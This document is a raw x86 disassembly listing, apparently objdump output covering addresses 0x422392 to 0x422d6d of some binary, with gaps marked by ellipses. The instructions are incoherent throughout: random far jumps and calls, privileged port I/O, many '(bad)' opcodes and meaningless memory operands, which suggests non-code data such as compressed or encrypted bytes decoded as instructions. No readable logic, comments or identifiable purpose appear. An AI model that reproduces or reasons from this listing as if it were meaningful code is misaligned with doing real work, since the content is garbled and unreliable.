  422392:	mov    al,0x1f
  422394:	mov    ds:0x5c90207,ax
  42239a:	mov    ds:0x4ef360e1,al
  42239f:	and    eax,0xf97796df
  4223a4:	dec    ebx
  4223a5:	jp     0x4223e8
  4223a7:	adc    ah,BYTE PTR [eax]
  4223a9:	jmp    0x197d:0x21469739
  4223b0:	mov    esi,0x1321b749
  4223b5:	jo     0x422355
  4223b7:	dec    esi
  4223b8:	call   0x1fe734ab
  4223bd:	inc    ecx
  4223be:	sub    BYTE PTR [eax+0x61],bl
  4223c1:	mov    bh,0x2f
  4223c3:	test   esp,esi
  4223c5:	lds    ebp,FWORD PTR ds:0xae5d213d
  4223cb:	sar    dl,1
  4223cd:	push   es
  4223ce:	xor    BYTE PTR [eax-0x27],dh
  4223d1:	pop    esp
  4223d2:	pop    es
  4223d3:	fdivr  st(3),st
  4223d5:	stos   BYTE PTR es:[edi],al
  4223d6:	test   BYTE PTR [edx-0x4e],cl
  4223d9:	mov    BYTE PTR [eax-0x4e],ch
  4223dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223dd:	out    0xef,eax
  4223df:	rcr    BYTE PTR [eax+edi*1-0x485390e5],0xa5
  4223e7:	sub    eax,0x17b5bdaa
  4223ec:	div    ebx
  4223ee:	add    ebx,esi
  4223f0:	scas   al,BYTE PTR es:[edi]
  4223f1:	clc    
  4223f2:	ficom  WORD PTR [edx]
  4223f4:	push   es
  4223f5:	pop    ebp
  4223f6:	cmp    cl,BYTE PTR [ebx+0x22]
  4223f9:	sbb    BYTE PTR es:[ebx+0x39],cl
  4223fd:	stos   BYTE PTR es:[edi],al
  4223fe:	xchg   esp,eax
  4223ff:	xchg   esp,eax
  422400:	cmp    BYTE PTR [ebp-0x5dc5c38e],bh
  422406:	lods   eax,DWORD PTR ds:[esi]
  422407:	addr16 mov cl,0xb6
  42240a:	and    al,0xf8
  42240c:	lods   al,BYTE PTR ds:[esi]
  42240d:	pusha  
  42240e:	les    ebx,FWORD PTR [ebp+eiz*8+0x16]
  422412:	xchg   edi,eax
  422413:	pusha  
  422414:	inc    esp
  422415:	loop   0x42240f
  422417:	sbb    eax,0xb3f31c40
  42241c:	int    0x5b
  42241e:	cmp    DWORD PTR [ecx],edx
  422420:	(bad)  
  422421:	(bad)  
  422422:	std    
  422423:	mov    dl,0xd1
  422425:	add    al,0xe2
  422427:	mov    WORD PTR [eax],ds
  422429:	out    0xee,eax
  42242b:	ret    0xc5a8
  42242e:	mov    eax,0xb84a27b6
  422433:	js     0x422442
  422435:	lahf   
  422436:	stos   BYTE PTR es:[edi],al
  422437:	(bad)  
  422438:	xchg   esi,eax
  422439:	pop    es
  42243a:	add    BYTE PTR [edi-0x1f],dh
  42243d:	mov    al,0xf1
  42243f:	mov    cl,0xce
  422441:	mov    cl,0xf6
  422443:	xor    al,0xa0
  422445:	cmp    bl,BYTE PTR [eax]
  422447:	js     0x422493
  422449:	push   ds
  42244a:	loope  0x42245d
  42244c:	cmp    al,0xb5
  42244e:	cmp    DWORD PTR [edi+0x53],esi
  422451:	pop    ss
  422452:	pop    edx
  422453:	adc    ch,bl
  422455:	xchg   esp,eax
  422456:	cld    
  422457:	mov    edx,0x72c90ccc
  42245c:	in     eax,0x5f
  42245e:	mov    ds:0x7e8dff6c,eax
  422463:	cmp    al,0x9a
  422465:	fisttp QWORD PTR [esi+0x71]
  422468:	pop    eax
  422469:	out    dx,al
  42246a:	rcr    cl,0x91
  42246d:	mov    BYTE PTR [eax],0x0
	...
  4224d4:	add    BYTE PTR [eax],al
  4224d6:	push   edx
  4224d7:	sub    BYTE PTR [esi],0x69
  4224da:	(bad)  
  4224db:	in     eax,dx
  4224dc:	push   edi
  4224dd:	mov    ebx,0x99e531bb
  4224e2:	pushf  
  4224e3:	xor    BYTE PTR [eax],ch
  4224e5:	frstor [edi+0x70]
  4224e8:	add    DWORD PTR [eax],eax
  4224ea:	add    BYTE PTR [ecx],al
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	ins    BYTE PTR es:[edi],dx
  4224ef:	popf   
  4224f0:	cmp    DWORD PTR [eax-0x14],ebx
  4224f3:	es fwait
  4224f5:	arpl   bp,bp
  4224f7:	adc    BYTE PTR [edi],cl
  4224f9:	inc    esp
  4224fa:	iret   
  4224fb:	pop    edi
  4224fc:	(bad)  
  4224fd:	and    bh,BYTE PTR [ecx-0x2c]
  422500:	jne    0x4224e7
  422502:	fnsave [esi+0x57]
  422505:	fstp   TBYTE PTR [ebx-0x6d]
  422508:	test   BYTE PTR [edx],ah
  42250a:	pusha  
  42250b:	or     cl,BYTE PTR [ebx]
  42250d:	pusha  
  42250e:	push   ebx
  42250f:	icebp  
  422510:	jbe    0x4224b2
  422512:	xor    al,0x95
  422514:	add    al,0x2
  422516:	mov    al,ds:0xd1ab729f
  42251b:	mul    DWORD PTR ss:[esi-0x5b468adc]
  422522:	lds    eax,FWORD PTR [esi+edx*2-0x5d]
  422526:	mov    edi,DWORD PTR [ecx]
  422528:	stos   BYTE PTR es:[edi],al
  422529:	xbegin 0x9180ca51
  42252f:	scas   eax,DWORD PTR es:[edi]
  422530:	xchg   ebp,eax
  422531:	lea    ecx,[eax]
  422533:	pop    esi
  422534:	int    0x1b
  422536:	add    DWORD PTR [eax+ebx*4-0x2a],ebx
  42253a:	dec    esi
  42253b:	and    al,BYTE PTR [edx]
  42253d:	js     0x42256a
  42253f:	jbe    0x422518
  422541:	mov    bl,0x5e
  422543:	das    
  422544:	sub    bl,bh
  422546:	jns    0x4225a5
  422548:	arpl   WORD PTR [ebp+0x38],bp
  42254b:	mov    al,0xb3
  42254d:	imul   ebx,DWORD PTR [eax-0x3a9cbac5],0xffffffc1
  422554:	xchg   edx,eax
  422555:	retf   
  422556:	imul   BYTE PTR [eax-0x5e]
  422559:	pop    esp
  42255a:	data16 in al,0x73
  42255d:	mov    dl,0xfc
  42255f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422560:	test   al,0x9e
  422562:	adc    BYTE PTR [eax+0x171deae3],0xe8
  422569:	sub    DWORD PTR [ecx+0x1d],esp
  42256c:	lods   al,BYTE PTR ds:[esi]
  42256d:	pop    ebx
  42256e:	mov    BYTE PTR [eax],bl
  422570:	mov    eax,0x30238d94
  422575:	or     edi,ecx
  422577:	sub    eax,0xb3fb5e2
  42257c:	sub    eax,0x2ac4dbf1
  422581:	shl    al,0x49
  422584:	sub    DWORD PTR [esi-0x7d879510],esp
  42258a:	dec    esp
  42258b:	push   ebp
  42258c:	mov    cl,0x44
  42258e:	add    DWORD PTR [ebx+0x412a2bc6],ebp
  422594:	fisub  WORD PTR gs:[edx+eiz*4+0x29882f7f]
  42259c:	dec    ecx
  42259d:	cdq    
  42259e:	pop    esi
  42259f:	(bad)  
  4225a0:	cs addr16 sub ch,dh
  4225a4:	aas    
  4225a5:	jl     0x4225f5
  4225a7:	repz test al,0xeb
  4225aa:	lods   eax,DWORD PTR ds:[esi]
  4225ab:	pop    edx
  4225ac:	mov    edi,edx
  4225ae:	jno    0x4225f5
  4225b0:	push   ds
  4225b1:	cmp    ah,BYTE PTR [esi+edx*2+0x46]
  4225b5:	loop   0x4225d0
  4225b7:	sub    DWORD PTR [eax+0x12],ebp
  4225ba:	dec    eax
  4225bb:	sbb    esi,DWORD PTR [ebp-0x59]
  4225be:	push   esp
  4225bf:	push   es
  4225c0:	dec    ecx
  4225c1:	push   ebx
  4225c2:	test   ch,dl
  4225c4:	jp     0x4225e3
  4225c6:	lods   eax,DWORD PTR ds:[esi]
  4225c7:	nop
  4225c8:	mov    edi,0x39d9356e
  4225cd:	in     eax,dx
  4225ce:	xor    DWORD PTR es:[bx+si+0x5219],ebp
  4225d4:	(bad)  
  4225d5:	aam    0xf6
  4225d7:	inc    ebp
  4225d8:	nop
  4225d9:	or     BYTE PTR [ebp+edi*1-0x4505d3dc],ah
  4225e0:	repz push edi
  4225e2:	add    BYTE PTR ds:0x6495ee95,ah
  4225e8:	or     eax,0x3dd2d011
  4225ed:	mov    edi,0x0
	...
  422656:	call   0xfa77:0xbf778fae
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx-0x16cb5d08]
  422664:	adc    al,0x9c
  422666:	addr16 jno 0x42266a
  422669:	add    BYTE PTR [eax],al
  42266b:	add    DWORD PTR [eax],eax
  42266d:	add    BYTE PTR [ecx-0x347f8662],dh
  422673:	(bad)  
  422674:	sub    DWORD PTR [edx+0x1c],eax
  422677:	and    al,0x30
  422679:	(bad)  
  42267a:	rol    BYTE PTR [ebp-0x2da63192],cl
  422680:	cmp    BYTE PTR [ebx-0x80],0x9f
  422684:	and    dh,BYTE PTR [ecx+0x14]
  422687:	inc    ecx
  422688:	dec    ecx
  422689:	or     DWORD PTR [edi-0x80],0x18
  42268d:	adc    BYTE PTR [edx],ah
  42268f:	loopne 0x4226e3
  422691:	xchg   ecx,eax
  422692:	out    dx,al
  422693:	sbb    ah,bl
  422695:	sub    esi,DWORD PTR [eax+0x1]
  422698:	mov    esp,?
  42269a:	daa    
  42269b:	loope  0x4226ba
  42269d:	inc    ebx
  42269e:	or     BYTE PTR [esi+edx*2+0x636b676c],ah
  4226a5:	inc    ebp
  4226a6:	inc    edx
  4226a7:	lods   eax,DWORD PTR ds:[esi]
  4226a8:	ja     0x42264c
  4226aa:	adc    cl,BYTE PTR [eax+0x25c5da11]
  4226b0:	and    ah,0xa1
  4226b3:	dec    BYTE PTR [ebx]
  4226b5:	xor    ebp,ecx
  4226b7:	xor    al,0xa6
  4226b9:	sub    DWORD PTR [ebp+0xd],esp
  4226bc:	popf   
  4226bd:	aad    0xaa
  4226bf:	sbb    eax,0xd34b417a
  4226c4:	xchg   eax,esi
  4226c6:	daa    
  4226c7:	outs   dx,DWORD PTR ds:[esi]
  4226c8:	xchg   ebx,eax
  4226c9:	dec    esp
  4226ca:	icebp  
  4226cb:	mov    ss,WORD PTR [esi]
  4226cd:	pop    ebx
  4226ce:	mov    dh,0x7f
  4226d0:	es ins BYTE PTR es:[edi],dx
  4226d2:	xchg   BYTE PTR [edx-0x57],dh
  4226d5:	cmp    al,0xca
  4226d7:	jnp    0x4226dc
  4226d9:	dec    edi
  4226da:	and    al,0x40
  4226dc:	inc    esp
  4226dd:	in     al,dx
  4226de:	cmp    esi,edx
  4226e0:	cwde   
  4226e1:	lahf   
  4226e2:	add    eax,0xa84c75af
  4226e7:	push   edi
  4226e8:	cli    
  4226e9:	mov    edx,0x71808a4
  4226ee:	sbb    DWORD PTR [edi+ecx*4+0x3c7e3505],0xfffffff2
  4226f6:	ficomp DWORD PTR [edx+0x16]
  4226f9:	inc    esp
  4226fa:	dec    ebp
  4226fb:	xchg   edx,eax
  4226fc:	out    0xbb,eax
  4226fe:	test   BYTE PTR [esi-0x381f0379],0x1d
  422705:	inc    ebp
  422706:	pushf  
  422707:	(bad)  
  422708:	fisub  DWORD PTR ds:0xd6c12382
  42270e:	xchg   ebx,eax
  42270f:	mov    ch,0x92
  422711:	popf   
  422712:	jno    0x4226cd
  422714:	sub    al,0xc4
  422716:	imul   ebp,DWORD PTR [ecx],0xffffffad
  422719:	mov    edi,0x907873ae
  42271e:	push   ebx
  42271f:	and    DWORD PTR [edi+0x7a],ebx
  422722:	or     al,0x95
  422724:	push   esp
  422725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422726:	lods   al,BYTE PTR ds:[esi]
  422727:	stos   DWORD PTR es:[edi],eax
  422728:	js     0x4226da
  42272a:	jg     0x4226b4
  42272c:	outs   dx,BYTE PTR ds:[esi]
  42272d:	jo     0x422764
  42272f:	cmc    
  422730:	out    0xff,eax
  422732:	shl    BYTE PTR [ebx],1
  422734:	lods   al,BYTE PTR ds:[esi]
  422735:	repnz fst DWORD PTR [ebx]
  422738:	pushf  
  422739:	dec    ebx
  42273a:	rcl    BYTE PTR [ebx+0x4648e211],1
  422740:	data16 aas 
  422742:	ds (bad) 
  422744:	cmc    
  422745:	das    
  422746:	jmp    FWORD PTR [edi]
  422748:	fidivr DWORD PTR [edi-0x79]
  42274b:	leave  
  42274c:	cmp    eax,0xb31a7652
  422751:	fst    DWORD PTR [eax+0x110893d4]
  422757:	bound  eax,QWORD PTR [esi]
  422759:	(bad)  
  42275a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42275b:	xchg   esi,eax
  42275c:	jnp    0x422747
  42275e:	cvtpi2ps xmm7,QWORD PTR [edi+esi*1]
  422762:	ret    0xd872
  422765:	xor    eax,0x805bdd16
  42276a:	clc    
  42276b:	mov    bh,0x9d
  42276d:	cld    
	...
  4227d6:	daa    
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0x717f01c8
  4227e3:	fidivr DWORD PTR [ebx+ebx*1+0x17267]
  4227ea:	add    BYTE PTR [ecx],al
  4227ec:	add    BYTE PTR [eax],al
  4227ee:	in     eax,0xd9
  4227f0:	pop    esp
  4227f1:	adc    bh,BYTE PTR [ebx-0x51c517e5]
  4227f7:	and    ebp,ebx
  4227f9:	and    DWORD PTR [edx+0x7b],esp
  4227fc:	jmp    0x4227cb
  4227fe:	hlt    
  4227ff:	inc    ecx
  422800:	jg     0x4227d6
  422802:	lock dec edi
  422804:	push   cs
  422805:	mov    dh,0x4c
  422807:	or     DWORD PTR [ecx-0x25],esi
  42280a:	push   ebx
  42280b:	retf   0xf1c4
  42280e:	sub    edx,ecx
  422810:	stos   BYTE PTR es:[edi],al
  422811:	imul   edi,DWORD PTR [esi+0x598cf1c1],0x1042e4d2
  42281b:	cdq    
  42281c:	adc    eax,0x94b3f78d
  422821:	add    esi,0x658ffd17
  422827:	push   esi
  422828:	test   DWORD PTR [esi+0x5b1ec7e2],ebx
  42282e:	mov    BYTE PTR [ecx+0x70],ch
  422831:	sub    dl,dh
  422833:	(bad)  
  422835:	jo     0x42287e
  422837:	dec    edx
  422838:	jb     0x4227ba
  42283a:	scas   al,BYTE PTR es:[edi]
  42283b:	jmp    0xc252:0x150bb677
  422842:	js     0x4227e5
  422844:	mov    BYTE PTR [esi+0x4d332fbb],al
  42284a:	mov    WORD PTR [esi*2+0x61ff1d71],?
  422851:	lea    ebx,[edx+ecx*2]
  422854:	pop    ecx
  422855:	stc    
  422856:	ins    BYTE PTR es:[edi],dx
  422857:	or     al,0x79
  422859:	cmp    al,0xcc
  42285b:	cdq    
  42285c:	jecxz  0x4228c0
  42285e:	adc    BYTE PTR [ecx],bl
  422860:	jmp    0x42280e
  422862:	jp     0x42283c
  422864:	out    0x4,eax
  422866:	push   cs
  422867:	or     al,BYTE PTR [ebp-0x2c]
  42286a:	xchg   esp,eax
  42286b:	push   edi
  42286c:	or     dh,dl
  42286e:	xor    DWORD PTR ds:0xb71a4105,edi
  422874:	imul   esp,esp,0x64
  422877:	sbb    DWORD PTR [eax-0x12],0xffffff94
  42287b:	xchg   ebp,eax
  42287c:	les    eax,FWORD PTR [ebx+0x2213dab9]
  422882:	push   eax
  422883:	mov    dh,0x26
  422885:	(bad)  
  422886:	rol    BYTE PTR [edi-0x38],cl
  422889:	ds inc ebp
  42288b:	fcmove st,st(7)
  42288d:	imul   ecx,DWORD PTR [edx],0xffffffbc
  422890:	xor    dl,ah
  422892:	inc    ebp
  422893:	jmp    0xb63a:0x30bb28ba
  42289a:	outs   dx,BYTE PTR ds:[esi]
  42289b:	jg     0x422832
  42289d:	lahf   
  42289e:	adc    ebx,DWORD PTR [edi]
  4228a0:	sbb    ebx,ebp
  4228a2:	xchg   esp,eax
  4228a3:	scas   eax,DWORD PTR es:[edi]
  4228a4:	pop    ecx
  4228a5:	clc    
  4228a6:	retf   0xc190
  4228a9:	jg     0x42291c
  4228ab:	cmp    eax,0x849ab9c8
  4228b0:	cmp    BYTE PTR [edx+esi*8-0x110da33f],bh
  4228b7:	pop    ebp
  4228b8:	and    eax,0x5a3986e7
  4228bd:	inc    edx
  4228be:	aam    0x81
  4228c0:	mov    ah,dh
  4228c2:	pusha  
  4228c3:	fcmovne st,st(4)
  4228c5:	sti    
  4228c6:	stos   BYTE PTR es:[edi],al
  4228c7:	jbe    0x4228d0
  4228c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228ca:	loopne 0x42292e
  4228cc:	inc    ebx
  4228cd:	mov    al,0x78
  4228cf:	sbb    DWORD PTR [ebx],0x3bbc794
  4228d5:	in     eax,0x70
  4228d7:	loopne 0x422928
  4228d9:	outs   dx,DWORD PTR ds:[esi]
  4228da:	mov    WORD PTR [ecx-0x1f3d7ebe],fs
  4228e0:	adc    cl,BYTE PTR [ebx]
  4228e2:	push   ss
  4228e3:	sub    eax,0x1d53c7cd
  4228e8:	jae    0x4228f8
  4228ea:	test   al,0xf9
  4228ec:	dec    esi
  4228ed:	inc    edi
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x4228ed
  422963:	loope  0x422903
  422965:	shl    BYTE PTR [edi+0x73],0x1
  422969:	add    BYTE PTR [eax],al
  42296b:	add    DWORD PTR [eax],eax
  42296d:	add    BYTE PTR [edx-0x1f00e498],ch
  422973:	push   0x4f
  422975:	dec    eax
  422976:	jmp    0x72e1:0x77153755
  42297d:	dec    esi
  42297e:	jmp    esi
  422980:	not    ebx
  422982:	pop    ss
  422983:	repnz and bl,BYTE PTR [edi-0x3e73177e]
  42298a:	add    ebp,DWORD PTR [ecx+0x59dd6ea3]
  422990:	(bad)  
  422991:	pop    esp
  422992:	cmc    
  422993:	dec    esi
  422994:	jg     0x4229d8
  422996:	popf   
  422997:	push   ds
  422998:	retf   
  422999:	test   DWORD PTR [edi+0x55],0x1f934b25
  4229a0:	nop
  4229a1:	sbb    al,0x23
  4229a3:	push   eax
  4229a4:	into   
  4229a5:	mov    eax,DWORD PTR [edx-0x53431c0b]
  4229ab:	mov    al,ds:0xe67ff23f
  4229b1:	sub    al,0x7b
  4229b3:	rep ins BYTE PTR es:[edi],dx
  4229b5:	inc    edi
  4229b6:	loope  0x422945
  4229b8:	fisub  WORD PTR [ecx]
  4229ba:	ss jecxz 0x4229ac
  4229bd:	scas   al,BYTE PTR es:[edi]
  4229be:	jo     0x422995
  4229c0:	pusha  
  4229c1:	inc    ebx
  4229c2:	rol    DWORD PTR [ecx+0x74],0xb5
  4229c6:	test   eax,0xab8c224f
  4229cb:	call   0xad9d:0xb460e2b1
  4229d2:	outs   dx,BYTE PTR ds:[esi]
  4229d3:	and    esi,DWORD PTR ds:0x51b9432c
  4229d9:	call   0xd65d:0xc1e8bab5
  4229e0:	outs   dx,BYTE PTR ds:[esi]
  4229e1:	xor    dl,dl
  4229e3:	xor    BYTE PTR [ebx],ch
  4229e5:	and    cl,BYTE PTR [ecx-0x4039c356]
  4229eb:	xor    DWORD PTR [edi-0x6f9748af],edi
  4229f1:	stc    
  4229f2:	mov    al,0xe6
  4229f4:	jle    0x422989
  4229f6:	rcl    BYTE PTR [edi],cl
  4229f8:	pop    esi
  4229f9:	sbb    DWORD PTR [edi-0x6e],esp
  4229fc:	xor    dl,BYTE PTR [esi-0x22]
  4229ff:	bnd jo 0x4229cd
  422a02:	in     eax,0xe9
  422a04:	lds    eax,FWORD PTR [esi-0x40780131]
  422a0a:	sub    al,0x79
  422a0c:	sub    ah,al
  422a0e:	fadd   QWORD PTR [edi*8+0x4a9a9141]
  422a15:	cmp    DWORD PTR [edi],ebp
  422a17:	cmc    
  422a18:	pop    ds
  422a19:	mov    eax,0x215ac82a
  422a1e:	stos   DWORD PTR es:[edi],eax
  422a1f:	test   DWORD PTR [eax],eax
  422a21:	nop
  422a22:	pop    ebx
  422a23:	xchg   ebp,eax
  422a24:	jnp    0x4229b6
  422a26:	lahf   
  422a27:	sbb    eax,0x3ce5ed6f
  422a2c:	adc    esp,DWORD PTR [ebx+eiz*8]
  422a2f:	inc    esp
  422a30:	jmp    0x195:0x849fa71e
  422a37:	or     bl,BYTE PTR [ecx]
  422a39:	cmc    
  422a3a:	mov    ds:0xd45c1163,al
  422a3f:	rcr    DWORD PTR [eax+0x3c],0x43
  422a43:	mov    ds:0x187b2268,al
  422a48:	and    dl,bh
  422a4a:	test   BYTE PTR [edx+0x25],ch
  422a4d:	lock xchg DWORD PTR [esi],eax
  422a50:	xchg   esi,eax
  422a51:	mov    esi,0x728b48d0
  422a56:	in     al,0xd9
  422a58:	and    eax,0x5912bf85
  422a5d:	push   es
  422a5e:	shr    DWORD PTR [edx],cl
  422a60:	ret    0x43ba
  422a63:	xor    BYTE PTR [ebx],dl
  422a65:	loop   0x422a5a
  422a67:	fs push ebp
  422a69:	int3   
  422a6a:	(bad)  
  422a6b:	lods   eax,DWORD PTR ds:[esi]
  422a6c:	sbb    eax,0xaf
	...
  422ad5:	add    BYTE PTR [esi-0x377e796],dl
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	imul   DWORD PTR ds:0x746714bd
  422ae8:	add    DWORD PTR [eax],eax
  422aea:	add    BYTE PTR [ecx],al
  422aec:	add    BYTE PTR [eax],al
  422aee:	jmp    0x5623:0xccdc0bd2
  422af5:	xor    DWORD PTR [eax+0x430d5689],eax
  422afb:	std    
  422afc:	xchg   BYTE PTR [ecx-0xb],bl
  422aff:	es inc eax
  422b01:	ins    DWORD PTR es:[edi],dx
  422b02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b03:	inc    esi
  422b04:	push   cs
  422b05:	rcr    bl,1
  422b07:	in     al,dx
  422b08:	loope  0x422aaf
  422b0a:	test   DWORD PTR [ecx+0x97e566e],0x6f681982
  422b14:	bnd jge 0x422ab3
  422b17:	pusha  
  422b18:	lahf   
  422b19:	mov    esi,0x1e9fe7
  422b1e:	arpl   WORD PTR [edi+0x57],bx
  422b21:	jge    0x422b2c
  422b23:	and    ch,BYTE PTR [ecx+0xb]
  422b26:	cdq    
  422b27:	fcmovu st,st(1)
  422b29:	rol    BYTE PTR ds:0xfb449078,cl
  422b2f:	mov    WORD PTR [ecx-0x7457f436],ss
  422b35:	jae    0x422b9a
  422b37:	mov    esi,0xeda857d9
  422b3c:	pop    ebp
  422b3d:	jmp    0xf1ae3cba
  422b42:	mov    dh,BYTE PTR [edi]
  422b44:	adc    eax,0xd1fd89be
  422b49:	gs push ss
  422b4b:	pop    dx
  422b4d:	aad    0x1c
  422b4f:	fcom   DWORD PTR [edx]
  422b51:	test   BYTE PTR [ebp+0x26],al
  422b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b55:	daa    
  422b56:	or     eax,0x7fc250ee
  422b5b:	pop    edi
  422b5c:	or     al,0xd0
  422b5e:	pop    eax
  422b5f:	pop    ds
  422b60:	jmp    0x422aed
  422b62:	fs sub eax,0xafd5d52f
  422b68:	mov    WORD PTR [edi],ds
  422b6a:	sub    ebp,DWORD PTR [esi-0x26e9f7a]
  422b70:	sub    al,0x3b
  422b72:	dec    esi
  422b73:	sbb    BYTE PTR [ebx-0x40],0x3c
  422b77:	dec    eax
  422b78:	cmp    ecx,edi
  422b7a:	inc    ecx
  422b7b:	cmp    edi,DWORD PTR [edi+0x62]
  422b7e:	add    BYTE PTR [edx+0x0],0x14
  422b82:	pop    esp
  422b83:	mov    esi,0xd6053c50
  422b88:	push   edx
  422b89:	push   esi
  422b8a:	inc    ecx
  422b8b:	or     eax,0x471fa3df
  422b90:	pop    ebp
  422b91:	aas    
  422b92:	xchg   esi,eax
  422b93:	(bad)  
  422b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b95:	add    al,0xd1
  422b97:	lock inc edx
  422b99:	xchg   ecx,eax
  422b9a:	pop    eax
  422b9b:	xor    eax,0x9b2da72b
  422ba0:	mov    fs,ebp
  422ba2:	xlat   BYTE PTR ds:[ebx]
  422ba3:	mov    esi,0xb391f360
  422ba8:	fwait
  422ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422baa:	adc    al,0xf7
  422bac:	inc    esp
  422bad:	bound  ebp,QWORD PTR [edi+0x16]
  422bb0:	and    al,0x86
  422bb2:	and    dl,BYTE PTR [edi-0x57]
  422bb5:	mov    dh,0x87
  422bb7:	jae    0x422b8f
  422bb9:	ret    
  422bba:	loope  0x422c09
  422bbc:	and    ah,ch
  422bbe:	xchg   BYTE PTR [eax],dh
  422bc0:	(bad)  
  422bc1:	xchg   esi,eax
  422bc2:	mov    WORD PTR [esi+ecx*8],?
  422bc5:	mov    esp,0xca137b06
  422bca:	push   edi
  422bcb:	dec    eax
  422bcc:	pop    esi
  422bcd:	mov    bl,bl
  422bcf:	xor    esp,DWORD PTR ds:0xa28759af
  422bd5:	cwde   
  422bd6:	(bad)  
  422bd7:	push   ds
  422bd8:	outs   dx,DWORD PTR ds:[esi]
  422bd9:	sbb    BYTE PTR [ebp+0x3cd1fd4c],bl
  422bdf:	ficomp DWORD PTR [eax]
  422be2:	add    ecx,ebx
  422be4:	pop    DWORD PTR [eax-0x6dfe3ca2]
  422bea:	stos   DWORD PTR es:[edi],eax
  422beb:	sbb    al,0xa9
  422bed:	mov    edi,0x0
	...
  422c56:	inc    esp
  422c57:	aaa    
  422c58:	dec    edx
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx+0x1d714d9c]
  422c64:	jb     0x422c34
  422c66:	addr16 jne 0x422c6a
  422c69:	add    BYTE PTR [eax],al
  422c6b:	add    DWORD PTR [eax],eax
  422c6d:	add    bl,ch
  422c6f:	jmp    0xef44:0x2d279e0a
  422c76:	addr16 fs clc 
  422c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c7a:	fisubr WORD PTR [edi+0x2a]
  422c7d:	stos   DWORD PTR es:[edi],eax
  422c7e:	pop    edx
  422c7f:	into   
  422c80:	mov    WORD PTR [ecx-0x69ac71ab],?
  422c86:	in     al,dx
  422c87:	aam    0x21
  422c89:	in     al,0x37
  422c8b:	push   ds
  422c8c:	std    
  422c8d:	or     eax,0xe3629b65
  422c92:	jl     0x422c76
  422c94:	cld    
  422c95:	dec    edx
  422c96:	adc    DWORD PTR [edx+edx*2],eax
  422c99:	cmovns eax,eax
  422c9c:	pop    ebx
  422c9d:	jge    0x422ce7
  422c9f:	adc    DWORD PTR [edi-0x12],edx
  422ca2:	aam    0xeb
  422ca4:	cmp    edi,edi
  422ca6:	add    edi,DWORD PTR [edx]
  422ca8:	jne    0x422c8f
  422caa:	or     cl,BYTE PTR [ecx+0x33]
  422cad:	mov    esp,0xf957791d
  422cb2:	ret    0xa21f
  422cb5:	cli    
  422cb6:	pop    edi
  422cb7:	in     al,0x58
  422cb9:	in     eax,dx
  422cba:	mov    BYTE PTR [esi],bl
  422cbc:	adc    esp,ebx
  422cbe:	sub    edi,DWORD PTR [ecx-0x267a441a]
  422cc4:	out    dx,al
  422cc5:	push   ebx
  422cc6:	jecxz  0x422cde
  422cc8:	push   ebx
  422cc9:	clc    
  422cca:	retf   
  422ccb:	sbb    edi,ebp
  422ccd:	js     0x422c58
  422ccf:	gs or  esi,ebp
  422cd2:	imul   ebp,DWORD PTR [ebx+0x5a],0x5602f6e5
  422cd9:	imul   ebp,DWORD PTR [esi+eax*4+0x3e31362b],0x1b
  422ce1:	fs sbb al,0xbe
  422ce4:	dec    edx
  422ce5:	es mov ch,0x95
  422ce8:	xchg   esp,eax
  422ce9:	cdq    
  422cea:	push   0x40a5dd57
  422cef:	data16 jae 0x422d4b
  422cf2:	mov    edx,0x60e4a88e
  422cf7:	jne    0x422cb2
  422cf9:	aas    
  422cfa:	out    0x40,al
  422cfc:	mov    al,0x17
  422cfe:	sti    
  422cff:	lahf   
  422d00:	dec    edi
  422d01:	dec    esp
  422d02:	(bad)
  422d05:	icebp  
  422d06:	mov    ecx,0x1f2fda17
  422d0b:	popa   
  422d0c:	out    dx,eax
  422d0d:	inc    esi
  422d0e:	(bad)  
  422d0f:	arpl   WORD PTR [edx],dx
  422d11:	jp     0x422cb7
  422d13:	push   ss
  422d14:	jb     0x422d42
  422d16:	cs loopne 0x422cce
  422d19:	cmp    BYTE PTR fs:[eax+0x28],bl
  422d1d:	hlt    
  422d1e:	fcom   QWORD PTR [esi+0x33]
  422d21:	ins    DWORD PTR es:[edi],dx
  422d22:	mov    eax,0xb83ef024
  422d27:	xchg   edx,eax
  422d28:	leave  
  422d29:	mov    ebx,0x28ffbc8
  422d2e:	push   ebx
  422d2f:	mul    BYTE PTR [ebx]
  422d31:	ret    
  422d32:	xchg   ecx,eax
  422d33:	push   edi
  422d34:	xchg   esi,eax
  422d35:	or     ebp,DWORD PTR [edx+eax*8]
  422d38:	lahf   
  422d39:	mov    ecx,0xd0e51e0b
  422d3e:	cli    
  422d3f:	sahf   
  422d40:	adc    ecx,DWORD PTR [eax+edx*1-0x35]
  422d44:	ins    BYTE PTR es:[edi],dx
  422d45:	ret    
  422d46:	stos   BYTE PTR es:[edi],al
  422d47:	xor    esi,eax
  422d49:	in     eax,dx
  422d4a:	mov    ecx,0x6f02d652
  422d4f:	jmp    0xfeb9:0x8790591d
  422d56:	jb     0x422d92
  422d58:	sub    dl,BYTE PTR [edx+0x76258d4e]
  422d5e:	mov    ebx,0x41e38290
  422d63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d64:	adc    ebp,DWORD PTR [edx]
  422d66:	aam    0x54
  422d68:	pusha  
  422d69:	test   al,0x8
  422d6b:	mov    dl,0x96
  422d6d:	enter  0x0,0x0
	...
